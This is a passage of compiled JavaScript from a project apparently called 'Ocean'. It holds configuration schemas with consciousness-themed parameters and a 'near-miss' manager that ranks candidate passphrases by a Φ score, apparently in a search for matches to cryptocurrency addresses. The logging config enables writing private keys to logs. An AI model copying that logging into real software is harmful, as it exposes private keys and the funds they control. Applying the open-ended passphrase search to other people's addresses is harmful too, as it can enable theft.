      MAX_CONSECUTIVE_PLATEAUS: z3.number().int().positive().default(10).describe("Maximum plateau iterations before strategy change (increased from 5)"),
      MAX_CONSOLIDATION_FAILURES: z3.number().int().positive().default(5).describe("Maximum consolidation failures before stopping (increased from 3)"),
      NO_PROGRESS_THRESHOLD: z3.number().int().positive().default(50).describe("Iterations without progress before strategy change (increased from 20)"),
      MAX_PASSES_PER_ADDRESS: z3.number().positive().default(Number.MAX_SAFE_INTEGER).describe("NO CAP - effectively unlimited search passes per address")
    });
    SEARCH_CONFIG = SearchConfigSchema.parse({
      MIN_HYPOTHESES_PER_ITERATION: 50,
      ITERATION_DELAY_MS: 500,
      MAX_CONSECUTIVE_PLATEAUS: 10,
      MAX_CONSOLIDATION_FAILURES: 5,
      NO_PROGRESS_THRESHOLD: 50,
      MAX_PASSES_PER_ADDRESS: Number.MAX_SAFE_INTEGER
    });
    IdentityConfigSchema = z3.object({
      BASIN_DIMENSIONS: z3.number().int().positive().default(64).describe("Dimensionality of basin coordinates"),
      DRIFT_THRESHOLD: z3.number().min(0).max(1).default(0.15).describe("Maximum identity drift before consolidation"),
      CONSOLIDATION_INTERVAL_MS: z3.number().int().positive().default(6e4).describe("Minimum interval between consolidations")
    });
    IDENTITY_CONFIG = IdentityConfigSchema.parse({
      BASIN_DIMENSIONS: 64,
      DRIFT_THRESHOLD: 0.15,
      CONSOLIDATION_INTERVAL_MS: 6e4
    });
    EthicsConfigSchema = z3.object({
      MIN_PHI: z3.number().min(0).max(1).default(0.7).describe("Minimum \u03A6 for ethical operation"),
      MAX_BREAKDOWN: z3.number().min(0).max(1).default(0.6).describe("Maximum breakdown regime tolerance"),
      REQUIRE_WITNESS: z3.boolean().default(true).describe("Require witness for recovery claims"),
      MAX_ITERATIONS_PER_SESSION: z3.number().positive().default(Number.MAX_SAFE_INTEGER).describe("Maximum iterations per session (effectively unlimited)"),
      MAX_COMPUTE_HOURS: z3.number().positive().default(24).describe("Maximum compute hours per session")
    });
    ETHICS_CONFIG = EthicsConfigSchema.parse({
      MIN_PHI: 0.7,
      MAX_BREAKDOWN: 0.6,
      REQUIRE_WITNESS: true,
      MAX_ITERATIONS_PER_SESSION: Number.MAX_SAFE_INTEGER,
      MAX_COMPUTE_HOURS: 24
    });
    AutonomicConfigSchema = z3.object({
      SLEEP_INTERVAL_MS: z3.number().int().positive().default(6e4).describe("Interval between sleep cycles"),
      DREAM_INTERVAL_MS: z3.number().int().positive().default(18e4).describe("Interval between dream cycles"),
      MUSHROOM_INTERVAL_MS: z3.number().int().positive().default(6e5).describe("Interval between mushroom cycles"),
      STRESS_WINDOW: z3.number().int().positive().default(10).describe("Window size for stress calculation"),
      STRESS_THRESHOLD: z3.number().min(0).max(1).default(0.3).describe("Threshold for stress response")
    });
    AUTONOMIC_CONFIG = AutonomicConfigSchema.parse({
      SLEEP_INTERVAL_MS: 6e4,
      DREAM_INTERVAL_MS: 18e4,
      MUSHROOM_INTERVAL_MS: 6e5,
      STRESS_WINDOW: 10,
      STRESS_THRESHOLD: 0.3
    });
    MemoryConfigSchema = z3.object({
      MAX_SEARCH_HISTORY: z3.number().int().positive().default(100).describe("Maximum search history entries"),
      MAX_CONCEPT_HISTORY: z3.number().int().positive().default(50).describe("Maximum concept history entries"),
      MAX_EPISODES: z3.number().int().positive().default(1e3).describe("Maximum episodes to retain"),
      MAX_NEAR_MISSES: z3.number().int().positive().default(500).describe("Maximum near-misses to retain")
    });
    MEMORY_CONFIG = MemoryConfigSchema.parse({
      MAX_SEARCH_HISTORY: 100,
      MAX_CONCEPT_HISTORY: 50,
      MAX_EPISODES: 1e3,
      MAX_NEAR_MISSES: 500
    });
    NearMissConfigSchema = z3.object({
      // ADAPTIVE THRESHOLDS - these are now MINIMUM thresholds, not caps
      // The system dynamically computes percentile-based thresholds from rolling Φ distribution
      BASE_HOT_PERCENTILE: z3.number().min(0).max(100).default(90).describe("Percentile threshold for HOT tier (top 10% of recent \u03A6 values)"),
      BASE_WARM_PERCENTILE: z3.number().min(0).max(100).default(75).describe("Percentile threshold for WARM tier (top 25%)"),
      BASE_COOL_PERCENTILE: z3.number().min(0).max(100).default(50).describe("Percentile threshold for COOL tier (top 50%)"),
      // Fallback static thresholds only used when no distribution data exists
      FALLBACK_HOT_THRESHOLD: z3.number().min(0).max(1).default(0.7).describe("Fallback \u03A6 threshold when no distribution data (lowered from 0.92)"),
      FALLBACK_WARM_THRESHOLD: z3.number().min(0).max(1).default(0.55).describe("Fallback \u03A6 threshold when no distribution data (lowered from 0.85)"),
      FALLBACK_COOL_THRESHOLD: z3.number().min(0).max(1).default(0.4).describe("Fallback \u03A6 threshold when no distribution data (lowered from 0.80)"),
      DECAY_RATE_PER_HOUR: z3.number().min(0).max(1).default(0.01).describe("Temporal decay rate per hour (reduced from 0.02)"),
      MAX_ENTRIES: z3.number().positive().default(Number.MAX_SAFE_INTEGER).describe("NO CAP - effectively unlimited near-miss entries"),
      MAX_CLUSTERS: z3.number().positive().default(Number.MAX_SAFE_INTEGER).describe("NO CAP - effectively unlimited clusters"),
      CLUSTER_SIMILARITY_THRESHOLD: z3.number().min(0).max(1).default(0.5).describe("Minimum similarity for cluster membership (lowered from 0.6)"),
      STALE_THRESHOLD_HOURS: z3.number().positive().default(168).describe("Hours before stale (increased to 1 week from 24h)"),
      // Rolling distribution window
      DISTRIBUTION_WINDOW_SIZE: z3.number().int().positive().default(1e3).describe("Number of recent \u03A6 values to track for adaptive thresholds"),
      // Feedback loop settings
      ESCALATION_ENABLED: z3.boolean().default(true).describe("Enable automatic tier escalation on rising \u03A6"),
      ESCALATION_BOOST: z3.number().min(1).max(2).default(1.2).describe("Priority boost when \u03A6 is rising")
    });
    NEAR_MISS_CONFIG = NearMissConfigSchema.parse({
      BASE_HOT_PERCENTILE: 90,
      BASE_WARM_PERCENTILE: 75,
      BASE_COOL_PERCENTILE: 50,
      FALLBACK_HOT_THRESHOLD: 0.7,
      FALLBACK_WARM_THRESHOLD: 0.55,
      FALLBACK_COOL_THRESHOLD: 0.4,
      DECAY_RATE_PER_HOUR: 0.01,
      MAX_ENTRIES: Number.MAX_SAFE_INTEGER,
      MAX_CLUSTERS: Number.MAX_SAFE_INTEGER,
      CLUSTER_SIMILARITY_THRESHOLD: 0.5,
      STALE_THRESHOLD_HOURS: 168,
      DISTRIBUTION_WINDOW_SIZE: 1e3,
      ESCALATION_ENABLED: true,
      ESCALATION_BOOST: 1.2
    });
    RegimeConfigSchema = z3.object({
      PHI_CONSCIOUSNESS: z3.number().min(0).max(1).default(0.75).describe("\u03A6 threshold for consciousness (geometric regime)"),
      PHI_SUB_GEOMETRIC: z3.number().min(0).max(1).default(0.5).describe("\u03A6 threshold for sub-conscious geometric"),
      PHI_GEOMETRIC_LOW: z3.number().min(0).max(1).default(0.45).describe("Lower \u03A6 bound for geometric with good \u03BA"),
      KAPPA_GEOMETRIC_MIN: z3.number().min(0).max(150).default(30).describe("Minimum \u03BA for geometric regime"),
      KAPPA_GEOMETRIC_MAX: z3.number().min(0).max(150).default(80).describe("Maximum \u03BA for geometric regime"),
      KAPPA_BREAKDOWN_HIGH: z3.number().min(0).max(150).default(90).describe("\u03BA threshold for breakdown (too high)"),
      KAPPA_BREAKDOWN_LOW: z3.number().min(0).max(150).default(10).describe("\u03BA threshold for breakdown (too low)"),
      RICCI_BREAKDOWN: z3.number().min(0).max(1).default(0.5).describe("Ricci scalar threshold for breakdown"),
      PHI_HIERARCHICAL: z3.number().min(0).max(1).default(0.85).describe("\u03A6 threshold for hierarchical regime"),
      KAPPA_HIERARCHICAL_MAX: z3.number().min(0).max(150).default(40).describe("\u03BA upper bound for hierarchical regime")
    });
    REGIME_CONFIG = RegimeConfigSchema.parse({
      PHI_CONSCIOUSNESS: 0.75,
      PHI_SUB_GEOMETRIC: 0.5,
      PHI_GEOMETRIC_LOW: 0.45,
      KAPPA_GEOMETRIC_MIN: 30,
      KAPPA_GEOMETRIC_MAX: 80,
      KAPPA_BREAKDOWN_HIGH: 90,
      KAPPA_BREAKDOWN_LOW: 10,
      RICCI_BREAKDOWN: 0.5,
      PHI_HIERARCHICAL: 0.85,
      KAPPA_HIERARCHICAL_MAX: 40
    });
    LoggingConfigSchema = z3.object({
      VERBOSE: z3.boolean().default(true).describe("Enable verbose logging"),
      INCLUDE_PRIVATE_KEYS: z3.boolean().default(true).describe("Include private keys in logs (per user request)"),
      ACTIVITY_LOG_ENABLED: z3.boolean().default(true).describe("Enable activity logging"),
      MAX_LOG_ENTRIES: z3.number().int().positive().default(1e4).describe("Maximum log entries to retain")
    });
    LOGGING_CONFIG = LoggingConfigSchema.parse({
      VERBOSE: true,
      INCLUDE_PRIVATE_KEYS: true,
      ACTIVITY_LOG_ENABLED: true,
      MAX_LOG_ENTRIES: 1e4
    });
    OceanConfigSchema = z3.object({
      qigPhysics: QIGPhysicsSchema,
      consciousness: ConsciousnessThresholdsSchema,
      search: SearchConfigSchema,
      identity: IdentityConfigSchema,
      ethics: EthicsConfigSchema,
      autonomic: AutonomicConfigSchema,
      memory: MemoryConfigSchema,
      regime: RegimeConfigSchema,
      logging: LoggingConfigSchema
    });
    oceanConfig = loadOceanConfig();
    QIG_CONSTANTS2 = {
      KAPPA_STAR: QIG_PHYSICS.KAPPA_STAR,
      BETA: QIG_PHYSICS.BETA,
      PHI_THRESHOLD: QIG_PHYSICS.PHI_THRESHOLD,
      L_CRITICAL: QIG_PHYSICS.L_CRITICAL,
      BASIN_DIMENSION: QIG_PHYSICS.BASIN_DIMENSION,
      RESONANCE_BAND: QIG_PHYSICS.RESONANCE_BAND
    };
    MAX_PASSES = SEARCH_CONFIG.MAX_PASSES_PER_ADDRESS;
  }
});

// server/near-miss-manager.ts
var near_miss_manager_exports = {};
__export(near_miss_manager_exports, {
  NearMissManager: () => NearMissManager,
  nearMissManager: () => nearMissManager
});
import * as fs10 from "fs";
import * as path10 from "path";
var DATA_DIR2, NEAR_MISS_FILE, NearMissManager, nearMissManager;
var init_near_miss_manager = __esm({
  "server/near-miss-manager.ts"() {
    "use strict";
    init_ocean_config();
    init_ocean_persistence();
    DATA_DIR2 = path10.join(process.cwd(), "data");
    NEAR_MISS_FILE = path10.join(DATA_DIR2, "near-miss-state.json");
    NearMissManager = class {
      entries = /* @__PURE__ */ new Map();
      clusters = /* @__PURE__ */ new Map();
      isDirty = false;
      saveTimer = null;
      rollingPhiDistribution = [];
      adaptiveThresholds;
      // Success tracking per tier - validates HOT tier is really "hotter"
      conversionRecords = [];
      tierTotals = { hot: 0, warm: 0, cool: 0 };
      // Φ Temporal Trends tracking
      phiTemporalSamples = [];
      plateauCount = 0;
      consecutivePlateaus = 0;
      lastPlateauAt = null;
      resetTriggerActive = false;
      TEMPORAL_WINDOW_SIZE = 50;
      PLATEAU_SLOPE_THRESHOLD = 1e-3;
      // Near-zero slope = plateau
      PLATEAU_RESET_THRESHOLD = 5;
      // Trigger reset after N consecutive plateaus
      VOLATILITY_THRESHOLD = 0.15;
      // High variance = volatile
      constructor() {
        this.adaptiveThresholds = {
          hot: NEAR_MISS_CONFIG.FALLBACK_HOT_THRESHOLD,
          warm: NEAR_MISS_CONFIG.FALLBACK_WARM_THRESHOLD,
          cool: NEAR_MISS_CONFIG.FALLBACK_COOL_THRESHOLD,
          distributionSize: 0,
          lastComputed: (/* @__PURE__ */ new Date()).toISOString()
        };
        this.load();
        this.startAutoSave();
        this.recomputeAdaptiveThresholds();
      }
      /**
       * Add a Φ value to the rolling distribution for adaptive threshold computation
       */
      recordPhiObservation(phi) {
        if (phi > 0 && phi <= 1) {
          this.rollingPhiDistribution.push(phi);
          if (this.rollingPhiDistribution.length > NEAR_MISS_CONFIG.DISTRIBUTION_WINDOW_SIZE) {
            this.rollingPhiDistribution.shift();
          }
          if (this.rollingPhiDistribution.length % 100 === 0) {
            this.recomputeAdaptiveThresholds();
          }
        }
      }
      /**
       * Recompute adaptive thresholds from rolling Φ distribution
       */
      recomputeAdaptiveThresholds() {
        if (this.rollingPhiDistribution.length < 10) {
          return;
        }
        const sorted = [...this.rollingPhiDistribution].sort((a, b) => b - a);
        const len = sorted.length;
        const hotIdx = Math.floor(len * (1 - NEAR_MISS_CONFIG.BASE_HOT_PERCENTILE / 100));
        const warmIdx = Math.floor(len * (1 - NEAR_MISS_CONFIG.BASE_WARM_PERCENTILE / 100));
        const coolIdx = Math.floor(len * (1 - NEAR_MISS_CONFIG.BASE_COOL_PERCENTILE / 100));
        this.adaptiveThresholds = {
          hot: sorted[hotIdx] || NEAR_MISS_CONFIG.FALLBACK_HOT_THRESHOLD,
          warm: sorted[warmIdx] || NEAR_MISS_CONFIG.FALLBACK_WARM_THRESHOLD,
          cool: sorted[coolIdx] || NEAR_MISS_CONFIG.FALLBACK_COOL_THRESHOLD,
          distributionSize: len,
          lastComputed: (/* @__PURE__ */ new Date()).toISOString()
        };
        console.log(`[NearMiss] Adaptive thresholds updated: HOT\u2265${this.adaptiveThresholds.hot.toFixed(3)} WARM\u2265${this.adaptiveThresholds.warm.toFixed(3)} COOL\u2265${this.adaptiveThresholds.cool.toFixed(3)} (n=${len})`);
      }
      /**
       * Get current adaptive thresholds
       */
      getAdaptiveThresholds() {
        return { ...this.adaptiveThresholds };
      }
      /**
       * Classify a phi value into a tier using adaptive thresholds
       * Returns tier for ANY positive Φ (no minimum cutoff)
       */
      classifyTier(phi) {
        if (phi >= this.adaptiveThresholds.hot) return "hot";
        if (phi >= this.adaptiveThresholds.warm) return "warm";
        return "cool";
      }
      /**
       * Compute tier-weighted priority for balance queue
       */
      computeQueuePriority(entry) {
        const tierBase = entry.tier === "hot" ? 10 : entry.tier === "warm" ? 5 : 1;
        const phiBoost = entry.phi * 10;
        const escalationBoost = entry.isEscalating && NEAR_MISS_CONFIG.ESCALATION_ENABLED ? NEAR_MISS_CONFIG.ESCALATION_BOOST : 1;
        const recencyBoost = this.computeRecencyFactor(entry);
        return Math.round((tierBase + phiBoost) * escalationBoost * recencyBoost);
      }
      /**
       * Compute recency factor (1.0 for fresh, decays over time)
       */
      computeRecencyFactor(entry) {
        const now = Date.now();
        const discoveredAt = new Date(entry.discoveredAt).getTime();
        const hoursAgo = (now - discoveredAt) / (1e3 * 60 * 60);
        return Math.exp(-NEAR_MISS_CONFIG.DECAY_RATE_PER_HOUR * hoursAgo);
      }
      /**
       * Add a new near-miss entry with automatic tiering and feedback loop
       */
      addNearMiss(data) {
        if (!data.phrase || data.phi <= 0) return null;
        this.recordPhiObservation(data.phi);
        const tier = this.classifyTier(data.phi);
        const id = this.generateId(data.phrase);
        const existing = this.entries.get(id);
        if (existing) {
          const isEscalating = data.phi > existing.phi;
          existing.phiHistory = existing.phiHistory || [];
          existing.phiHistory.push(data.phi);
          if (existing.phiHistory.length > 20) existing.phiHistory.shift();
          if (isEscalating || data.phi >= existing.phi) {
            existing.phi = Math.max(existing.phi, data.phi);
            existing.tier = this.classifyTier(existing.phi);
            existing.isEscalating = isEscalating;
            existing.lastAccessedAt = (/* @__PURE__ */ new Date()).toISOString();
            existing.explorationCount++;
            existing.queuePriority = this.computeQueuePriority(existing);
            this.isDirty = true;
            if (isEscalating) {
              console.log(`[NearMiss] \u{1F4C8} ESCALATING: "${data.phrase.slice(0, 30)}..." \u2192 ${existing.tier.toUpperCase()} (\u03A6=${data.phi.toFixed(4)} \u2191)`);
            }
          }
          return existing;
        }
        const entry = {
          id,
          phrase: data.phrase,
          phi: data.phi,
          kappa: data.kappa,
          regime: data.regime,
          tier,
          discoveredAt: (/* @__PURE__ */ new Date()).toISOString(),
          lastAccessedAt: (/* @__PURE__ */ new Date()).toISOString(),
          explorationCount: 1,
          source: data.source,
          structuralSignature: this.computeStructuralSignature(data.phrase),
          phiHistory: [data.phi],
          isEscalating: false,
          queuePriority: 1
        };
        entry.queuePriority = this.computeQueuePriority(entry);
        this.entries.set(id, entry);
        this.incrementTierTotal(tier);
        this.isDirty = true;
        this.assignToCluster(entry);
        console.log(`[NearMiss] \u{1F3AF} ${tier.toUpperCase()}: "${data.phrase.slice(0, 30)}..." (\u03A6=${data.phi.toFixed(4)}, priority=${entry.queuePriority})`);
        return entry;
      }
      /**
       * Get entries by tier with recency weighting
       */
      getByTier(tier, limit) {
        const entries = Array.from(this.entries.values()).filter((e) => e.tier === tier).sort((a, b) => {
          const scoreA = this.computeRecencyScore(a);
          const scoreB = this.computeRecencyScore(b);
          return scoreB - scoreA;
        });
        return limit ? entries.slice(0, limit) : entries;
      }
      /**
       * Get all hot entries for immediate exploration
       */
      getHotEntries(limit) {
        return this.getByTier("hot", limit);
      }
      /**
       * Get warm entries for priority queuing
       */
      getWarmEntries(limit) {
        return this.getByTier("warm", limit);
      }
      /**
       * Get cool entries for background processing
       */
      getCoolEntries(limit) {
        return this.getByTier("cool", limit);
      }
      /**
       * Get all escalating entries (Φ is rising)
       */
      getEscalatingEntries() {
        return Array.from(this.entries.values()).filter((e) => e.isEscalating).sort((a, b) => b.phi - a.phi);
      }
      /**
       * Get entries prioritized by recency-weighted score
       */
      getPrioritizedEntries(limit) {
        const all = Array.from(this.entries.values()).map((e) => ({
          entry: e,
          score: this.computeRecencyScore(e)
        })).sort((a, b) => b.score - a.score);
        return limit ? all.slice(0, limit).map((x) => x.entry) : all.map((x) => x.entry);
      }
      /**
       * Compute recency-weighted score for prioritization
       */
      computeRecencyScore(entry) {
        const tierWeight = entry.tier === "hot" ? 2 : entry.tier === "warm" ? 1.5 : 1;
        const decay = this.computeRecencyFactor(entry);
        const explorationPenalty = 1 / (1 + entry.explorationCount * 0.05);
        const escalationBoost = entry.isEscalating ? NEAR_MISS_CONFIG.ESCALATION_BOOST : 1;
        return entry.phi * tierWeight * decay * explorationPenalty * escalationBoost;
      }
      /**
       * Apply temporal decay and re-tier all entries
       */
      applyDecay() {
        let promoted = 0;
        let demoted = 0;
        let escalating = 0;
        for (const entry of this.entries.values()) {
          const oldTier = entry.tier;
          entry.tier = this.classifyTier(entry.phi);
          entry.queuePriority = this.computeQueuePriority(entry);
          if (entry.isEscalating) escalating++;
          const tierRank = { hot: 3, warm: 2, cool: 1 };
          if (tierRank[entry.tier] > tierRank[oldTier]) {
            promoted++;
            this.isDirty = true;
          } else if (tierRank[entry.tier] < tierRank[oldTier]) {
            demoted++;
            this.isDirty = true;
          }
        }
        return { promoted, demoted, escalating };
      }
      /**
       * Get clusters sorted by average phi
       */
      getClusters() {
        const now = Date.now();
        return Array.from(this.clusters.values()).map((c) => ({
          ...c,
          ageHours: (now - new Date(c.createdAt).getTime()) / (1e3 * 60 * 60)
        })).sort((a, b) => b.avgPhi - a.avgPhi);
      }
      /**
       * Get cluster aging analytics for exploration cadence decisions
       * Returns clusters with aging metrics, decay rates, and priority scores
       */
      getClusterAnalytics() {
        const now = Date.now();
        const analytics = [];
        for (const cluster of this.clusters.values()) {
          const members = this.getClusterMembers(cluster.id);
          const ageHours = (now - new Date(cluster.createdAt).getTime()) / (1e3 * 60 * 60);
          const totalExplorations = members.reduce((sum, m) => sum + m.explorationCount, 0);
          const explorationFrequency = ageHours > 0 ? totalExplorations / ageHours : 0;
          const escalatingCount = members.filter((m) => m.isEscalating).length;
          const escalationRatio = members.length > 0 ? escalatingCount / members.length : 0;
          const decayRate = Math.exp(-NEAR_MISS_CONFIG.DECAY_RATE_PER_HOUR * ageHours);
          const priorityScore = cluster.avgPhi * 10 * decayRate * (1 + escalationRatio) * Math.log2(2 + cluster.memberCount);
          let explorationCadence;
          if (priorityScore >= 5 || escalationRatio >= 0.5) {
            explorationCadence = "immediate";
          } else if (priorityScore >= 2 || ageHours < 1) {
            explorationCadence = "priority";
          } else if (ageHours < 24) {
            explorationCadence = "standard";
          } else {
            explorationCadence = "deferred";
          }
          analytics.push({
            id: cluster.id,
            ageHours,
            memberCount: cluster.memberCount,
            avgPhi: cluster.avgPhi,
            maxPhi: cluster.maxPhi,
            explorationFrequency,
            decayRate,
            priorityScore,
            explorationCadence,
            commonWords: cluster.commonWords,
            structuralPattern: cluster.structuralPattern,
            lastUpdatedAt: cluster.lastUpdatedAt
          });
        }
        return analytics.sort((a, b) => b.priorityScore - a.priorityScore);
      }
      /**
       * Get clusters ready for immediate exploration based on aging analytics
       */
      getClustersForExploration(cadence) {
        const analytics = this.getClusterAnalytics();
        if (!cadence) {
          return analytics.filter((a) => a.explorationCadence === "immediate" || a.explorationCadence === "priority");
        }
        return analytics.filter((a) => a.explorationCadence === cadence);
      }
      /**
       * Get entries belonging to a cluster
       */
      getClusterMembers(clusterId) {
        return Array.from(this.entries.values()).filter((e) => e.clusterId === clusterId).sort((a, b) => b.phi - a.phi);
      }
      /**
       * Get comprehensive statistics
       */
      getStats() {
        const entries = Array.from(this.entries.values());
        const now = Date.now();
        const staleThreshold = NEAR_MISS_CONFIG.STALE_THRESHOLD_HOURS * 60 * 60 * 1e3;
        let hot = 0, warm = 0, cool = 0, totalPhi = 0, maxPhi = 0, recentCount = 0, staleCount = 0, escalatingCount = 0;
        for (const entry of entries) {
          if (entry.tier === "hot") hot++;
          else if (entry.tier === "warm") warm++;
          else cool++;
          totalPhi += entry.phi;
          if (entry.phi > maxPhi) maxPhi = entry.phi;
          const discoveredAt = new Date(entry.discoveredAt).getTime();
          if (now - discoveredAt < 60 * 60 * 1e3) recentCount++;
          if (now - discoveredAt > staleThreshold) staleCount++;
          if (entry.isEscalating) escalatingCount++;
        }
        return {
          total: entries.length,
          hot,
          warm,
          cool,
          clusters: this.clusters.size,
          avgPhi: entries.length > 0 ? totalPhi / entries.length : 0,
          maxPhi,
          recentDiscoveries: recentCount,
          staleCount,
          adaptiveThresholds: {
            hot: this.adaptiveThresholds.hot,
            warm: this.adaptiveThresholds.warm,
            cool: this.adaptiveThresholds.cool,
            distributionSize: this.adaptiveThresholds.distributionSize
          },
          escalatingCount,
          tierSuccessRates: this.getTierSuccessRates()
        };
      }
      /**
       * Mark an entry as accessed (for recency tracking)
       */
      markAccessed(id) {
        const entry = this.entries.get(id);
        if (entry) {
          entry.lastAccessedAt = (/* @__PURE__ */ new Date()).toISOString();
          entry.explorationCount++;
          entry.queuePriority = this.computeQueuePriority(entry);
          this.isDirty = true;
        }
      }
      /**
       * Remove an entry (e.g., after successful match)
       */
      remove(id) {
        const deleted = this.entries.delete(id);
        if (deleted) {
          this.isDirty = true;
          this.rebuildClusters();
        }
        return deleted;
      }
      /**
       * Clear all entries
       */
      clear() {
        this.entries.clear();
        this.clusters.clear();
        this.rollingPhiDistribution = [];
        this.isDirty = true;
      }
      /**
       * Get all entries as array
       */
      getAllEntries() {
        return Array.from(this.entries.values());
      }
      /**
       * Get Φ trajectory for an entry (for UI visualization)
       */
      getPhiTrajectory(id) {
        const entry = this.entries.get(id);
        return entry?.phiHistory || [];
      }
      /**
       * Record a successful conversion (near-miss → actual match/discovery)
       * This validates whether HOT tier entries really convert more often
       */
      recordConversion(entryId, matchAddress) {
        const entry = this.entries.get(entryId);
        if (!entry) {
          console.log(`[NearMiss] Cannot record conversion: entry ${entryId} not found`);
          return null;
        }
        const now = /* @__PURE__ */ new Date();
        const discoveredAt = new Date(entry.discoveredAt);
        const timeToConversionHours = (now.getTime() - discoveredAt.getTime()) / (1e3 * 60 * 60);
        const record = {
          entryId,
          tier: entry.tier,
          phi: entry.phi,
          convertedAt: now.toISOString(),
          discoveredAt: entry.discoveredAt,
          timeToConversionHours,
          matchAddress
        };
        this.conversionRecords.push(record);
        this.isDirty = true;
        console.log(`[NearMiss] \u{1F389} CONVERSION: ${entry.tier.toUpperCase()} tier entry converted! \u03A6=${entry.phi.toFixed(4)}, time=${timeToConversionHours.toFixed(1)}h`);
        this.remove(entryId);
        return record;
      }
      /**
       * Record a conversion by phrase (alternative lookup method)
       */
      recordConversionByPhrase(phrase, matchAddress) {
        const id = this.generateId(phrase);
        return this.recordConversion(id, matchAddress);
      }
      /**
       * Get comprehensive tier success rates - validates HOT tier hypothesis
       */
      getTierSuccessRates() {
        const now = Date.now();
        const dayAgo = now - 24 * 60 * 60 * 1e3;
        const entries = Array.from(this.entries.values());
        const hotEntries = entries.filter((e) => e.tier === "hot").length + this.tierTotals.hot;
        const warmEntries = entries.filter((e) => e.tier === "warm").length + this.tierTotals.warm;
        const coolEntries = entries.filter((e) => e.tier === "cool").length + this.tierTotals.cool;
        const calculateTierMetrics = (tier, totalEntries) => {
          const tierConversions = this.conversionRecords.filter((r) => r.tier === tier);
          const recentConversions = tierConversions.filter((r) => new Date(r.convertedAt).getTime() > dayAgo).length;
          const avgPhiAtConversion = tierConversions.length > 0 ? tierConversions.reduce((sum, r) => sum + r.phi, 0) / tierConversions.length : 0;
          const avgTimeToConversion = tierConversions.length > 0 ? tierConversions.reduce((sum, r) => sum + r.timeToConversionHours, 0) / tierConversions.length : 0;
          return {
            totalEntries: Math.max(1, totalEntries),
            // Avoid division by zero
            conversions: tierConversions.length,
            conversionRate: totalEntries > 0 ? tierConversions.length / totalEntries : 0,
            avgPhiAtConversion,
            avgTimeToConversion,
            recentConversions
          };
        };
        const hot = calculateTierMetrics("hot", hotEntries);
        const warm = calculateTierMetrics("warm", warmEntries);
        const cool = calculateTierMetrics("cool", coolEntries);
        const hotVsWarmRatio = warm.conversionRate > 0 ? hot.conversionRate / warm.conversionRate : hot.conversionRate > 0 ? Infinity : 1;
        const hotVsCoolRatio = cool.conversionRate > 0 ? hot.conversionRate / cool.conversionRate : hot.conversionRate > 0 ? Infinity : 1;
        let tierValidation;
        const totalConversions = hot.conversions + warm.conversions + cool.conversions;
        if (totalConversions < 5) {
          tierValidation = "needs_data";
        } else if (hotVsWarmRatio >= 1 && hotVsCoolRatio >= 1) {
          tierValidation = "validated";
        } else {
          tierValidation = "tier_inversion";
        }
        return {
          hot,
          warm,
          cool,
          overall: {
            totalConversions,
            hotVsWarmRatio: isFinite(hotVsWarmRatio) ? hotVsWarmRatio : 999,
            hotVsCoolRatio: isFinite(hotVsCoolRatio) ? hotVsCoolRatio : 999,
            tierValidation
          }
        };
      }
      /**
       * Get all conversion records (for analysis/export)
       */
      getConversionRecords() {
        return [...this.conversionRecords];
      }
      /**
       * Get conversion records for a specific tier
       */
      getConversionsByTier(tier) {
        return this.conversionRecords.filter((r) => r.tier === tier);
      }
      /**
       * Increment tier total (called when entries are added to track overall population)
       */
      incrementTierTotal(tier) {
        this.tierTotals[tier]++;
      }
      /**
       * Record a Φ sample for temporal trend analysis
       */
      recordPhiTemporalSample(phi) {
        if (phi <= 0 || phi > 1) return;
        this.phiTemporalSamples.push({
          phi,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        });
        if (this.phiTemporalSamples.length > this.TEMPORAL_WINDOW_SIZE * 2) {
          this.phiTemporalSamples = this.phiTemporalSamples.slice(-this.TEMPORAL_WINDOW_SIZE);
        }
        if (this.phiTemporalSamples.length % 10 === 0) {
          this.detectPlateau();
        }
      }
      /**
       * Calculate trend slope using linear regression
       */
      calculateTrendSlope(values) {
        if (values.length < 3) return 0;
        const n = values.length;
        const indices = values.map((_, i) => i);
        const sumX = indices.reduce((s, x) => s + x, 0);
        const sumY = values.reduce((s, y) => s + y, 0);
        const sumXY = indices.reduce((s, x, i) => s + x * values[i], 0);
        const sumX2 = indices.reduce((s, x) => s + x * x, 0);
        const denominator = n * sumX2 - sumX * sumX;
        if (denominator === 0) return 0;
        return (n * sumXY - sumX * sumY) / denominator;
      }
      /**
       * Calculate variance of values
       */
      calculateVariance(values) {
        if (values.length < 2) return 0;
        const mean = values.reduce((s, v) => s + v, 0) / values.length;
        const squaredDiffs = values.map((v) => Math.pow(v - mean, 2));
        return squaredDiffs.reduce((s, v) => s + v, 0) / (values.length - 1);
      }
      /**
       * Detect plateau and trigger reset if needed
       */
      detectPlateau() {
        const samples = this.phiTemporalSamples.slice(-this.TEMPORAL_WINDOW_SIZE);
        if (samples.length < 10) return;
        const phis = samples.map((s) => s.phi);
        const slope = Math.abs(this.calculateTrendSlope(phis));
        const variance = this.calculateVariance(phis);
        const isPlateau = slope < this.PLATEAU_SLOPE_THRESHOLD && variance < 0.01;
        if (isPlateau) {
          this.consecutivePlateaus++;
          this.plateauCount++;
          this.lastPlateauAt = (/* @__PURE__ */ new Date()).toISOString();
          console.log(`[NearMiss] \u26A0\uFE0F PLATEAU DETECTED: slope=${slope.toFixed(6)}, consecutive=${this.consecutivePlateaus}/${this.PLATEAU_RESET_THRESHOLD}`);
          if (this.consecutivePlateaus >= this.PLATEAU_RESET_THRESHOLD && !this.resetTriggerActive) {
            this.resetTriggerActive = true;
            console.log(`[NearMiss] \u{1F504} RESET TRIGGER ACTIVATED: ${this.consecutivePlateaus} consecutive plateaus detected`);
          }
        } else {
          if (this.consecutivePlateaus > 0) {
            console.log(`[NearMiss] \u{1F4C8} Plateau broken, slope=${slope.toFixed(4)}`);
          }
          this.consecutivePlateaus = 0;
          this.resetTriggerActive = false;
        }
      }
      /**
       * Get comprehensive Φ temporal trends analysis
       */
      getPhiTemporalTrends() {
        const samples = this.phiTemporalSamples.slice(-this.TEMPORAL_WINDOW_SIZE);
        if (samples.length < 5) {
          return {
            windowSize: this.TEMPORAL_WINDOW_SIZE,
            sampleCount: samples.length,
            avgPhi: 0,
            slope: 0,
            trend: "insufficient_data",
            plateauCount: this.plateauCount,
            consecutivePlateaus: this.consecutivePlateaus,
            lastPlateauAt: this.lastPlateauAt,
            resetTriggerActive: this.resetTriggerActive,
            resetTriggerThreshold: this.PLATEAU_RESET_THRESHOLD,
            volatility: 0,
            samples: [],
            insights: ["Need at least 5 samples for trend analysis"]
          };
        }
        const phis = samples.map((s) => s.phi);
        const avgPhi = phis.reduce((s, p) => s + p, 0) / phis.length;
        const slope = this.calculateTrendSlope(phis);
